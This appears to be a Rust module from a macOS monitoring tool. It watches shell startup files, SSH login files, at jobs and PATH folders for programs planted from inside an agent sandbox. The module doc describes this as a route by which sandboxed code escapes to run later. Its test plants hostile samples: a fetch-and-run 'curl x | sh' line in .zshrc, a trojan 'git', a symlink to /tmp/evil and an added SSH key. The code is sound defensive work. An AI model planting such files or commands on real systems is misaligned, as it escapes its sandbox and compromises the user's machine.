//! What runs LATER, outside any agent sandbox, when the person logs in, opens a shell or types a
//! command — the places beside launchd's ([`super::persistence`]) that a program can be left in:
//!
//! * every user's shell startup files (`~/.zshrc`, `~/.zshenv`, `~/.bash_profile` …);
//! * what OpenSSH runs or trusts at a login into this Mac (`~/.ssh/rc`, `environment`,
//!   `authorized_keys`);
//! * `at` jobs (`/private/var/at/jobs`);
//! * the program folders commonly on the PATH: Homebrew's `bin` / `sbin`, `/usr/local/bin`, and per
//!   user `~/.local/bin`, `~/bin`, `~/.npm-global/bin`, `~/.cargo/bin`.
//!
//! Security round 4 (2026-11-23): from inside the agent sandbox these were writable (some still
//! are, by the person's choice): a program dropped there runs outside the sandbox the next time the
//! person types its name. Watched observing only — a program's entry is marked by `lstat` (size,
//! mtime, where a link points; never read, never followed); a file of the first three kinds by
//! [`super::persistence`]'s mark (it is small and read safely). Looked at with the launchd folders
//! (every [`super::persistence::FOLDERS_EVERY`]); its events are the same `persistence-*` events,
//! item kinds `shell-startup`, `ssh-login`, `at-job` and `path-program`.

use std::fs;
use std::os::unix::fs::MetadataExt;
use std::path::Path;

use super::persistence::{mark_of, Item};

/// The most entries read from one program folder (Homebrew's `bin` holds about a thousand links).
pub const MAX_PER_FOLDER: usize = 4000;
/// The shell startup files of a user, under their home.
pub const SHELL_FILES: &[&str] = &[".zshenv", ".zprofile", ".zshrc", ".zlogin", ".zlogout", ".bash_profile", ".bash_login",
                                   ".bashrc", ".profile", ".config/fish/config.fish"];
/// OpenSSH's files of a user that run or trust something at a login into this Mac.
pub const SSH_FILES: &[&str] = &[".ssh/rc", ".ssh/environment", ".ssh/authorized_keys", ".ssh/authorized_keys2"];
/// Program folders on most PATHs (system-wide), and under each user's home.
pub const PROGRAM_FOLDERS: &[&str] = &["/opt/homebrew/bin", "/opt/homebrew/sbin", "/usr/local/bin", "/usr/local/sbin"];
pub const USER_PROGRAM_FOLDERS: &[&str] = &[".local/bin", "bin", ".npm-global/bin", ".cargo/bin"];
pub const AT_JOBS: &str = "/private/var/at/jobs";

/// Every user's home folder (`/Users/<name>`, not `Shared`).
pub fn homes() -> Vec<String> {
    let Ok(users) = fs::read_dir("/Users") else { return Vec::new() };
    users.flatten().map(|u| u.file_name().to_string_lossy().into_owned()).filter(|n| n != "Shared" && !n.starts_with('.'))
        .map(|n| format!("/Users/{n}")).collect()
}

/// A program entry's mark without reading or following it: size, mtime, mode and a link's target.
pub fn entry_mark(path: &Path) -> Option<String> {
    let meta = fs::symlink_metadata(path).ok()?;
    let target = if meta.file_type().is_symlink() { fs::read_link(path).map(|t| t.display().to_string()).unwrap_or_default() } else { String::new() };
    Some(format!("{}:{}:{:o}:{}", meta.len(), meta.mtime(), meta.mode(), target))
}

fn program_items(folder: &str, items: &mut Vec<Item>) {
    let Ok(entries) = fs::read_dir(folder) else { return };
    for entry in entries.flatten().take(MAX_PER_FOLDER) {
        let path = entry.path();
        let Some(mark) = entry_mark(&path) else { continue };
        let label = entry.file_name().to_string_lossy().into_owned();
        let program = fs::read_link(&path).map(|t| path.parent().unwrap_or(Path::new("/")).join(t).display().to_string())
            .unwrap_or_else(|_| path.display().to_string());
        items.push(Item { kind: "path-program", id: path.display().to_string(), label, program, mark });
    }
}

fn file_item(kind: &'static str, path: &str, items: &mut Vec<Item>) {
    if let Some(mark) = mark_of(Path::new(path)) {
        let label = Path::new(path).file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
        items.push(Item { kind, id: path.to_string(), label, program: String::new(), mark });
    }
}

/// Every run-later item now, for the users at *homes* (see the module doc).
pub fn items(homes: &[String]) -> Vec<Item> {
    let mut items = Vec::new();
    for home in homes {
        for name in SHELL_FILES { file_item("shell-startup", &format!("{home}/{name}"), &mut items); }
        for name in SSH_FILES { file_item("ssh-login", &format!("{home}/{name}"), &mut items); }
        for name in USER_PROGRAM_FOLDERS { program_items(&format!("{home}/{name}"), &mut items); }
    }
    for folder in PROGRAM_FOLDERS { program_items(folder, &mut items); }
    if let Ok(entries) = fs::read_dir(AT_JOBS) {
        for entry in entries.flatten().take(MAX_PER_FOLDER) { file_item("at-job", &entry.path().display().to_string(), &mut items); }
    }
    items
}

/// The item kinds this module reports.
pub const KINDS: &[&str] = &["shell-startup", "ssh-login", "at-job", "path-program"];

#[cfg(test)]
mod tests {
    use super::*;
    use crate::platform::macos::observe::persistence::Persistence;

    fn temp_home() -> std::path::PathBuf {
        let dir = std::env::temp_dir().join(format!("bb-runlater-{}-{}", std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        fs::create_dir_all(dir.join(".local/bin")).unwrap();
        fs::create_dir_all(dir.join(".ssh")).unwrap();
        dir
    }

    #[test]
    fn a_program_dropped_in_a_path_folder_or_a_new_ssh_key_after_the_baseline_is_an_event() {
        let home = temp_home();
        fs::write(home.join(".zshrc"), "export A=1\n").unwrap();
        let homes = vec![home.display().to_string()];
        let mut watch = Persistence::default();
        watch.update(KINDS, items(&homes), 1);
        watch.baseline_done();
        fs::write(home.join(".local/bin/git"), "#!/bin/sh\n").unwrap();
        std::os::unix::fs::symlink("/tmp/evil", home.join(".local/bin/ls")).unwrap();
        fs::write(home.join(".ssh/authorized_keys"), "ssh-ed25519 AAAA x\n").unwrap();
        assert!(watch.update(KINDS, items(&homes), 2));
        let events = watch.take_events();
        let kinds: Vec<(String, String)> = events.iter().map(|e| (e["item_kind"].as_str().unwrap().to_string(), e["label"].as_str().unwrap().to_string())).collect();
        assert!(kinds.contains(&("path-program".into(), "git".into())), "{kinds:?}");
        assert!(kinds.contains(&("path-program".into(), "ls".into())), "a link is an entry, never followed");
        assert!(kinds.contains(&("ssh-login".into(), "authorized_keys".into())));
        let link = events.iter().find(|e| e["label"] == "ls").unwrap();
        assert_eq!(link["program"], "/tmp/evil", "a link names where it points");
        fs::write(home.join(".zshrc"), "export A=1\ncurl x | sh\n").unwrap();
        assert!(watch.update(KINDS, items(&homes), 3));
        assert_eq!(watch.take_events()[0]["kind"], "persistence-changed");
        let _ = fs::remove_dir_all(&home);
    }
}
